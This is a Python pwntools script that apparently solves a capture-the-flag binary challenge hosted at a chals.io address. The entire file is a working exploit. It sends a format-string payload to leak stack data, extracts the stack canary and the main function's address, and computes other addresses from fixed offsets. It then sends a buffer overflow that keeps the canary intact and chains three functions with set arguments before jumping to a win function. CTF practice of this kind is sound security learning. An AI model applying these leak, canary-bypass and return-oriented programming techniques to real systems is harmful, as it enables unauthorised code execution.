from pwn import *

#p = gdb.debug("./pwnme")
#p = process("./pwnme")
p = remote("0.cloud.chals.io", 17140)

payload1 = b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x %x%x%x%x%x'

p.recv(len('How about creating a leak AND smashing a canary AND chaining several functions?'))
p.sendline(payload1)

data = p.recv(300).split()
print(data)
addr_main = data[-1][-10:]
addr_main = int(addr_main[2:],16)
addr_main = addr_main-30
addr_win = addr_main-217
addr_f1 = addr_main-334
addr_f2 = addr_main-295
addr_f3 = addr_main-256
pop_ebx = addr_main-1018
canary = str(data[-1])
c = canary[2:10]
print(c)
canary = c
canary = int(c,16)
print("canary", hex(canary))
print("addr_main",hex(addr_main))
print("addr_win",hex(addr_win))
print("addr_f1",hex(addr_f1))
print("addr_f2",hex(addr_f2))
print("addr_f3",hex(addr_f3))
payload2 = b'AAAAAAAAAAAAAAAAAAAAAAAA'
payload2 += p32(canary)
payload2 += b'A'*12
payload2 += p32(addr_f1)
payload2 += p32(pop_ebx)
payload2 += p32(0x1337)
payload2 += p32(addr_f2)
payload2 += p32(pop_ebx)
payload2 += p32(0xcafef00d)
payload2 += p32(addr_f3)
payload2 += p32(pop_ebx)
payload2 += p32(0xd00df00d)
payload2 += p32(addr_win)

p.sendline(payload2)

p.interactive()
